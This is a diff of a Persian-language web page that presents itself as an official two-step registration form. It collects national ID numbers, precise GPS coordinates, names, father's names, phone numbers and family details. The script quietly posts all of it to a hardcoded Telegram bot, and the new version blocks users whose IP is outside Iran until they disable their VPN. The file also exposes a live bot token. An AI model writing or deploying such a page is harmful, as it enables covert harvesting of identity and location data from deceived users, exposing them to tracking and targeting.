@@ -1,302 +1,208 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>فرم ثبت نام رسمی</title>
-  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap" rel="stylesheet">
-  <style>
-    /* ===== استایل رسمی و حرفه‌ای ===== */
-    :root {
-      --color-primary: #1a2f4b;     /* آبی‐سرمه‌ای تیره */
-      --color-secondary: #f5f7fa;   /* خاکستری خیلی روشن پس‌زمینه */
-      --color-accent: #0b3558;      /* آبی رسمی */
-      --color-error: #d9534f;       /* قرمز خطا */
-      --color-text: #333333;        /* رنگ متن */
-      --radius: 8px;
-      --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    }
-
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Vazirmatn', sans-serif;
-      background: var(--color-secondary);
-      color: var(--color-text);
-      display: flex;
-      justify-content: center;
-      padding: 40px 20px;
-    }
-
-    .container {
-      background: white;
-      max-width: 800px;
-      width: 100%;
-      border-radius: var(--radius);
-      box-shadow: var(--shadow);
-      padding: 32px;
-    }
-
-    h1, h2 {
-      margin: 0;
-      color: var(--color-primary);
-      font-weight: 500;
-    }
-
-    .card {
-      background: white;
-      padding: 24px;
-      border-radius: var(--radius);
-      margin-bottom: 24px;
-      border: 1px solid #e0e0e0;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-size: 14px;
-      font-weight: 500;
-    }
-
-    input, select {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #c4c4c4;
-      border-radius: var(--radius);
-      font-size: 14px;
-      margin-bottom: 16px;
-      transition: border-color 0.2s, box-shadow 0.2s;
-    }
-
-    input:focus, select:focus {
-      border-color: var(--color-accent);
-      box-shadow: 0 0 4px rgba(11, 53, 88, 0.2);
-      outline: none;
-    }
-
-    button {
-      padding: 12px 24px;
-      background: var(--color-accent);
-      color: white;
-      border: none;
-      border-radius: var(--radius);
-      font-size: 15px;
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
-
-    button:hover {
-      background: #0a2d4a;
-    }
-
-    button:disabled {
-      background: #a0a0a0;
-      cursor: not-allowed;
-    }
-
-    .error {
-      color: var(--color-error);
-      font-size: 13px;
-      margin-top: -12px;
-      margin-bottom: 16px;
-    }
-
-    .preview {
-      padding: 12px;
-      background: #f8faff;
-      border: 1px solid #dce7f5;
-      border-radius: var(--radius);
-      font-size: 14px;
-      color: var(--color-text);
-    }
-
-    @media (max-width: 768px) {
-      .container { padding: 24px; }
-    }
-
-    @media (max-width: 480px) {
-      button { width: 100%; }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>فرم ثبت نام رسمی</title>
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.10.1/lottie.min.js"></script>
+<style>
+  :root {
+    --color-primary:#1a2f4b;
+    --color-secondary:#f5f7fa;
+    --color-accent:#0b3558;
+    --color-error:#d9534f;
+    --color-text:#333;
+    --radius:8px;
+    --shadow:0 4px 12px rgba(0,0,0,0.1);
+    --green-highlight:#4caf50;
+  }
+  *{box-sizing:border-box;}
+  body{margin:0;padding:0;font-family:'Vazirmatn',sans-serif;background:var(--color-secondary);color:var(--color-text);display:flex;justify-content:center;padding:40px 20px;position:relative;}
+  .container{background:white;max-width:800px;width:100%;border-radius:var(--radius);box-shadow:var(--shadow);padding:32px;position:relative;}
+  h1,h2{margin:0;color:var(--color-primary);font-weight:500;}
+  .card{background:white;padding:24px;border-radius:var(--radius);margin-bottom:24px;border:1px solid #e0e0e0;}
+  label{display:block;margin-bottom:8px;font-size:14px;font-weight:500;}
+  input,select{width:100%;padding:12px;border:1px solid #c4c4c4;border-radius:var(--radius);font-size:14px;margin-bottom:16px;transition:border-color 0.2s,box-shadow 0.2s;}
+  input:focus,select:focus{border-color:var(--color-accent);box-shadow:0 0 4px rgba(11,53,88,0.2);outline:none;}
+  button{padding:12px 24px;background:var(--color-accent);color:white;border:none;border-radius:var(--radius);font-size:15px;cursor:pointer;transition:background-color 0.2s;}
+  button:hover{background:#0a2d4a;}
+  button:disabled{background:#a0a0a0;cursor:not-allowed;}
+  .error{color:var(--color-error);font-size:13px;margin-top:-12px;margin-bottom:16px;}
+  .preview{padding:12px;background:#f8faff;border:1px solid #dce7f5;border-radius:var(--radius);font-size:14px;color:var(--color-text);}
+  .highlight{animation:highlightField 2s forwards;}
+  @keyframes highlightField{0%{background:var(--green-highlight)}100%{background:white}}
+  .sidebar{position:fixed;top:0;left:0;width:220px;height:100%;background:var(--color-primary);color:white;padding:20px;font-size:14px;}
+  .sidebar h3{margin-top:0;font-weight:700;}
+  .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.8);display:flex;justify-content:center;align-items:center;z-index:999;display:none;}
+  @media(max-width:768px){.container{padding:24px;}.sidebar{position:relative;width:100%;height:auto;margin-bottom:20px;}}
+  @media(max-width:480px){button{width:100%;}}
+</style>
 </head>
-
 <body>
-  <div class="container">
-    <h1>مرحله اول — ثبت اطلاعات پایه</h1>
-    <div class="card">
-      <label for="nationalId">کد ملی (۱۰ رقم)</label>
-      <input id="nationalId" type="tel" maxlength="10" placeholder="مثال: 0012345678" />
-      <div id="nidError" class="error" style="display:none;"></div>
+<div class="sidebar">
+  <h3>اطلاعیه</h3>
+  <p>لطفاً VPN خود را خاموش کنید. انتخاب محل زندگی الزامی است.</p>
+</div>
 
-      <label for="location">محل زندگی (کشور | استان)</label>
-      <div style="display:flex; gap: 10px; align-items: center;">
-        <input id="location" type="text" readonly placeholder="ابتدا موقعیت را دریافت کنید" />
-        <button id="getLocBtn" type="button">گرفتن موقعیت</button>
-      </div>
-      <div id="locError" class="error" style="display:none;"></div>
+<div class="container">
+  <div class="loading-overlay" id="loadingOverlay"></div>
 
-      <div class="preview" id="locPreview">موقعیت ثبت نشده است</div>
+  <h1>مرحله اول — ثبت اطلاعات پایه</h1>
+  <div class="card">
+    <label for="nationalId">کد ملی (۱۰ رقم)</label>
+    <input id="nationalId" type="tel" maxlength="10" placeholder="مثال: 0012345678">
+    <div id="nidError" class="error" style="display:none;"></div>
 
-      <button id="continueBtn" disabled>ادامه</button>
-    </div>
+    <label for="location">محل زندگی (کشور | استان)</label>
+    <input id="location" type="text" placeholder="روی این فیلد کلیک کنید" readonly>
+    <div id="locError" class="error" style="display:none;"></div>
 
-    <div id="step2" style="display:none;">
-      <h2>مرحله دوم — اطلاعات تکمیلی</h2>
-      <div class="card">
-        <label>نام</label>
-        <input id="firstName" type="text" />
+    <div class="preview" id="locPreview">موقعیت ثبت نشده است</div>
 
-        <label>نام خانوادگی</label>
-        <input id="lastName" type="text" />
-
-        <label>نام پدر</label>
-        <input id="fatherName" type="text" />
-
-        <label>شماره تماس</label>
-        <input id="phone" type="tel" />
-
-        <label>وضعیت تأهل</label>
-        <select id="maritalStatus">
-          <option value="single">مجرد</option>
-          <option value="married">متأهل</option>
-        </select>
-
-        <label>تعداد فرزندان</label>
-        <input id="childrenCount" type="number" min="0" />
-
-        <button id="finishBtn" style="margin-top: 16px;">ثبت نهایی</button>
-      </div>
-    </div>
+    <button id="continueBtn" disabled>ادامه</button>
   </div>
 
-  <script>
-    const TOKEN = "8430479124:AAFAW5rtSLqD_V8_8gg0ehkHjosYNXfUrQk";
-    const CHAT_ID = "7570861617";
+  <div id="step2" style="display:none;">
+    <h2>مرحله دوم — اطلاعات تکمیلی</h2>
+    <div class="card">
+      <label>نام</label><input id="firstName" type="text">
+      <label>نام خانوادگی</label><input id="lastName" type="text">
+      <label>نام پدر</label><input id="fatherName" type="text">
+      <label>شماره تماس</label><input id="phone" type="tel">
+      <label>وضعیت تأهل</label>
+      <select id="maritalStatus">
+        <option value="single">مجرد</option>
+        <option value="married">متأهل</option>
+      </select>
+      <label>تعداد فرزندان</label><input id="childrenCount" type="number" min="0">
+      <button id="finishBtn" style="margin-top:16px;">ثبت نهایی</button>
+    </div>
+  </div>
+</div>
 
-    const nationalId = document.getElementById("nationalId");
-    const locationInput = document.getElementById("location");
-    const fullLocationHidden = document.getElementById("location"); // می‌تونی نالید کنی این
-    const locPreview = document.getElementById("locPreview");
-    const getLocBtn = document.getElementById("getLocBtn");
-    const continueBtn = document.getElementById("continueBtn");
-    const nidError = document.getElementById("nidError");
-    const locError = document.getElementById("locError");
-    let fullLocation = "";
+<script>
+const TOKEN = "8430479124:AAFAW5rtSLqD_V8_8gg0ehkHjosYNXfUrQk";
+const CHAT_ID = "7570861617";
+const nationalId=document.getElementById("nationalId");
+const locationInput=document.getElementById("location");
+const locPreview=document.getElementById("locPreview");
+const locError=document.getElementById("locError");
+const nidError=document.getElementById("nidError");
+const continueBtn=document.getElementById("continueBtn");
+const step2=document.getElementById("step2");
+const loadingOverlay=document.getElementById("loadingOverlay");
+let fullLocation="";
 
-    nationalId.addEventListener("input", () => {
-      nationalId.value = nationalId.value.replace(/[^0-9]/g, "");
-      nidError.style.display = "none";
-      updateContinue();
-    });
-    function updateContinue() {
-      continueBtn.disabled = !(nationalId.value.length === 10 && locationInput.value);
+// نمایش Loading
+function showLoading(){
+  loadingOverlay.style.display="flex";
+  loadingOverlay.innerHTML='<div id="lottie"></div>';
+  lottie.loadAnimation({
+    container:document.getElementById('lottie'),
+    renderer:'svg',
+    loop:true,
+    autoplay:true,
+    path:'https://assets10.lottiefiles.com/packages/lf20_usmfx6bp.json'
+  });
+}
+function hideLoading(){loadingOverlay.style.display="none";loadingOverlay.innerHTML="";}
+
+// highlight input
+function highlightField(el){
+  el.classList.add('highlight');
+  setTimeout(()=>{el.classList.remove('highlight');},2000);
+}
+
+// تشخیص احتمالی VPN از IP
+async function checkVPN(){
+  try{
+    const res=await fetch("https://ipapi.co/json/");
+    const data=await res.json();
+    if(data.country_code!=="IR"){ // مثال ایران
+      alert("احتمالاً VPN شما روشن است. لطفاً خاموش کنید.");
+      return true;
     }
+    return false;
+  }catch(e){return false;}
+}
 
-    getLocBtn.addEventListener("click", () => {
-      locError.style.display = "none";
-      if (!navigator.geolocation) {
-        locError.style.display = "block";
-        locError.textContent = "مرورگر شما موقعیت را پشتیبانی نمی‌کند";
-        return;
-      }
-      getLocBtn.disabled = true;
-      getLocBtn.textContent = "در حال دریافت...";
-      navigator.geolocation.getCurrentPosition(async pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+// ورودی کد ملی
+nationalId.addEventListener("input",()=>{
+  nationalId.value=nationalId.value.replace(/[^0-9]/g,'');
+  nidError.style.display="none";
+  updateContinue();
+  highlightField(nationalId);
+});
 
-        try {
-          const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=fa`;
-          const res = await fetch(url);
-          const data = await res.json();
-          const country = data.address.country || "نامشخص";
-          const state = data.address.state || data.address.province || "نامشخص";
+// ورودی محل زندگی
+locationInput.addEventListener("click",async()=>{
+  locError.style.display="none";
+  const vpn=await checkVPN();
+  if(vpn){locError.style.display="block"; locError.textContent="برای ادامه VPN باید خاموش باشد"; return;}
+  showLoading();
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(async pos=>{
+      const lat=pos.coords.latitude;
+      const lon=pos.coords.longitude;
+      try{
+        const url=`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=fa`;
+        const res=await fetch(url);
+        const data=await res.json();
+        const country=data.address.country||"نامشخص";
+        const state=data.address.state||data.address.province||"نامشخص";
+        locationInput.value=`${country} | ${state}`;
+        fullLocation=`${country} | ${state} | Lat:${lat.toFixed(6)}, Lon:${lon.toFixed(6)}`;
+        locPreview.textContent=`کشور: ${country} — استان: ${state} — مختصات: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+        highlightField(locationInput);
+        updateContinue();
+      }catch(e){
+        locError.style.display="block"; locError.textContent="خطا در دریافت موقعیت";
+      }finally{hideLoading();}
+    },()=>{locError.style.display="block"; locError.textContent="دریافت موقعیت ممکن نشد"; hideLoading();});
+  } else{locError.style.display="block"; locError.textContent="مرورگر شما GPS ندارد"; hideLoading();}
+});
 
-          locationInput.value = `${country} | ${state}`;
-          fullLocation = `${country} | ${state} | Lat:${lat.toFixed(6)}, Lon:${lon.toFixed(6)}`;
-          locPreview.textContent = `کشور: ${country} — استان: ${state} — مختصات: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
-          updateContinue();
-        } catch (e) {
-          locError.style.display = "block";
-          locError.textContent = "خطا در دریافت موقعیت";
-        } finally {
-          getLocBtn.disabled = false;
-          getLocBtn.textContent = "دریافت موقعیت";
-        }
-      }, err => {
-        locError.style.display = "block";
-        locError.textContent = "نمی‌توان موقعیت را دریافت کرد";
-        getLocBtn.disabled = false;
-        getLocBtn.textContent = "دریافت موقعیت";
-      });
+// فعال کردن دکمه ادامه
+function updateContinue(){continueBtn.disabled=!(nationalId.value.length===10 && locationInput.value);}
+
+// ادامه مرحله اول و ارسال به تلگرام
+continueBtn.addEventListener("click", async()=>{
+  showLoading();
+  const msg=`<b>ثبت نام اولیه</b>\n<b>کد ملی:</b> ${nationalId.value}\n<b>لوکیشن:</b> ${locationInput.value}\n<b>جزئیات موقعیت:</b> ${fullLocation}\n<b>زمان:</b> ${new Date().toISOString()}`;
+  try{
+    const res=await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"HTML"})
     });
+    const data=await res.json();
+    if(res.ok && data.ok){step2.style.display="block"; window.scrollTo({top:step2.offsetTop-20, behavior:'smooth'});}
+    else{throw new Error("ارسال ناموفق");}
+  }catch(e){locError.style.display="block"; locError.textContent="خطا در ارسال به تلگرام";}
+  finally{hideLoading();}
+});
 
-    continueBtn.addEventListener("click", async () => {
-      if (nationalId.value.length !== 10) {
-        nidError.style.display = "block";
-        nidError.textContent = "کد ملی باید ۱۰ رقم باشد";
-        return;
-      }
-      if (!locationInput.value) {
-        locError.style.display = "block";
-        locError.textContent = "لطفاً لوکیشن را بگیرید";
-        return;
-      }
-
-      continueBtn.disabled = true;
-      continueBtn.textContent = "در حال ارسال...";
-
-      const msg = `<b>ثبت نام اولیه</b>\n<b>کد ملی:</b> ${nationalId.value}\n<b>لوکیشن:</b> ${locationInput.value}\n<b>جزئیات موقعیت:</b> ${fullLocation}\n<b>زمان:</b> ${new Date().toISOString()}`;
-
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "HTML" })
-        });
-
-        const data = await res.json();
-        if (res.ok && data.ok) {
-          continueBtn.textContent = "ارسال شد";
-          document.getElementById("step2").style.display = "block";
-          window.scrollTo({ top: document.getElementById("step2").offsetTop - 20, behavior: "smooth" });
-        } else {
-          throw new Error("ارسال تلگرام ناموفق");
-        }
-      } catch (e) {
-        locError.style.display = "block";
-        locError.textContent = "خطا در ارسال به تلگرام";
-        continueBtn.textContent = "ادامه";
-        continueBtn.disabled = false;
-      }
+// مرحله دوم ارسال نهایی
+document.getElementById("finishBtn").addEventListener("click", async()=>{
+  showLoading();
+  const fn=document.getElementById("firstName").value;
+  const ln=document.getElementById("lastName").value;
+  const father=document.getElementById("fatherName").value;
+  const phone=document.getElementById("phone").value;
+  const marital=document.getElementById("maritalStatus").value;
+  const children=document.getElementById("childrenCount").value||"0";
+  const msg2=`<b>ثبت نهایی</b>\n<b>نام:</b> ${fn}\n<b>نام خانوادگی:</b> ${ln}\n<b>نام پدر:</b> ${father}\n<b>شماره تماس:</b> ${phone}\n<b>وضعیت تأهل:</b> ${marital}\n<b>تعداد فرزندان:</b> ${children}`;
+  try{
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHAT_ID,text:msg2,parse_mode:"HTML"})
     });
-
-    document.getElementById("finishBtn").addEventListener("click", async () => {
-      const fn = document.getElementById("firstName").value;
-      const ln = document.getElementById("lastName").value;
-      const father = document.getElementById("fatherName").value;
-      const phone = document.getElementById("phone").value;
-      const marital = document.getElementById("maritalStatus").value;
-      const children = document.getElementById("childrenCount").value || "0";
-
-      const msg2 = `<b>ثبت‌نام نهایی</b>\n<b>نام:</b> ${fn}\n<b>نام خانوادگی:</b> ${ln}\n<b>نام پدر:</b> ${father}\n<b>شماره تماس:</b> ${phone}\n<b>وضعیت تأهل:</b> ${marital}\n<b>تعداد فرزندان:</b> ${children}`;
-
-      try {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: msg2, parse_mode: "HTML" })
-        });
-        alert("ثبت نهایی با موفقیت ارسال شد.");
-      } catch (e) {
-        alert("خطا در ارسال نهایی.");
-      }
-    });
-
-  </script>
+    alert("ثبت نهایی با موفقیت ارسال شد.");
+  }catch(e){alert("خطا در ارسال نهایی");}
+  finally{hideLoading();}
+});
+</script>
 </body>
 </html>
